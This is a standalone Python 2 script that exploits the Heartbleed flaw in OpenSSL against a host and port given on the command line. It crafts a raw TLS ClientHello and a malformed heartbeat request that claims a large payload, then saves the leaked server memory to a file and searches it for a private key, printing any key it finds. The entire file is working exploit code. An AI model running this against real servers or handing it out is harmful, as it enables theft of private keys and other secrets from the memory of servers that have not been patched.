#! /usr/bin/python2.7

import socket
import sys
import ssl
import time
import struct

client_hello = [
    # TLS header ( 5 bytes)
    "16"            # Content type (0x16 for handshake)
    , "03 02"       # TLS Version
    , "00 dc"       # Length
    # Handshake header
    , "01"          # Type (01 for ClientHello)
    , "00 00 d8"    # Length
    , "03 02"       # TLS Version
    # Random (32 byte)
    , "53 43 5b 90 9d 9b 72 0b"
    , "bc 0c bc 2b 92 a8 48 97"
    , "cf bd 39 04 cc 16 0a 85"
    , "03 90 9f 77 04 33 d4 de"
    , "00"          # Session ID length
    , "00 66"       # Cipher suites length
    # Cipher suites (51 suites)
    , "c0 14 c0 0a c0 22 c0 21"
    , "00 39 00 38 00 88 00 87"
    , "c0 0f c0 05 00 35 00 84"
    , "c0 12 c0 08 c0 1c c0 1b"
    , "00 16 00 13 c0 0d c0 03"
    , "00 0a c0 13 c0 09 c0 1f"
    , "c0 1e 00 33 00 32 00 9a"
    , "00 99 00 45 00 44 c0 0e"
    , "c0 04 00 2f 00 96 00 41"
    , "c0 11 c0 07 c0 0c c0 02"
    , "00 05 00 04 00 15 00 12"
    , "00 09 00 14 00 11 00 08"
    , "00 06 00 03 00 ff"
    , "01"          # Compression methods length
    , "00"          # Compression method (00 for NULL)
    , "00 49"       # Extensions length
    # Extension: ec_point_formats
    , "00 0b 00 04 03 00 01 02"
    # Extension: elliptic_curves
    , "00 0a 00 34 00 32 00 0e"
    , "00 0d 00 19 00 0b 00 0c"
    , "00 18 00 09 00 0a 00 16"
    , "00 17 00 08 00 06 00 07"
    , "00 14 00 15 00 04 00 05"
    , "00 12 00 13 00 01 00 02"
    , "00 03 00 0f 00 10 00 11"
    # Extension: SessionTicket TLS
    , "00 23 00 00"
    # Extension: Heartbeat
    , "00 0f 00 01 01"
]

heartbeat = [ 
    "18"            # Content type (Heartbeat)
    , "03 02"       # TLS version
    , "00 03"       # Length
    , "01"          # Type (Req)
    , "40 00"       # Payload Length
]

# The server can split a package in more than one "send process"
# And we should not forget a socket is a byte stream, not a message stream :)
def recvall(socket, length):
    b = b''
    while length > 0:
        bb = socket.recv(length)
        b += bb
        length -= len(bb)
    return b

port = int(sys.argv[-1])
host = sys.argv[-2]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((host, port))

except Exception as e:
    print('Error connecting to the target host: ' + str(e))
    sys.exit(1)

hellopkg = "".join(client_hello).replace(' ', '').decode('hex')
hbeatpkg = "".join(heartbeat).replace(' ', '').decode('hex')

# This will rawly start the handshake with the server, making it
# load it's certificate and connect with the socket
try:
    s.send(hellopkg)

except Exception as e:
    print('Error sending hello package: ' + str(e))
    sys.exit(1)

# this will hold the incoming package header
# (content type, tls version, length)
info = (0, 0, 0)
payload = " "
while ord(payload[0]) != 0x0E: # wait for the end of handshaking step
    inf = s.recv(5)

    # unpack binary data as 1 unsigned char (B) and 2 unsigned byte (H)
    info = struct.unpack('>BHH', inf) 
    payload = recvall(s, info[2])

# Send corrupted heartbeat package
try:
    s.send(hbeatpkg)

except Exception as e:
    print('Error sending heartbleed package: ' + str(e))
    sys.exit(1)

info = (0, 0, 0)
payload = ""

# wait for heartbeat to be processed
while info[0] != 24: 
    info = s.recv(5)

    info = struct.unpack('>BHH', info) 
    payload = recvall(s, info[2])
    if len(payload) > 3:
        print('Server returned more data than it should, it\'s likely vulnerable.')
        with open('output.txt', 'w') as output:
            output.write(payload)
        print('Extra data writen into file \'output.txt\'')

        if 'END PRIVATE KEY' in payload:
            print('Bingo! PRIVATE KEY found in the extra data!')
            print(payload[payload.find('-----'):payload.find('KEY-----')+8])
            print(payload[payload.find('KEY-----')+8:payload.rfind('-----END')])
            print(payload[payload.rfind('-----END'):payload.rfind('-----')+5])
        sys.exit(0)

    else:
        print('Server did not return extra data')
        sys.exit(0)
    
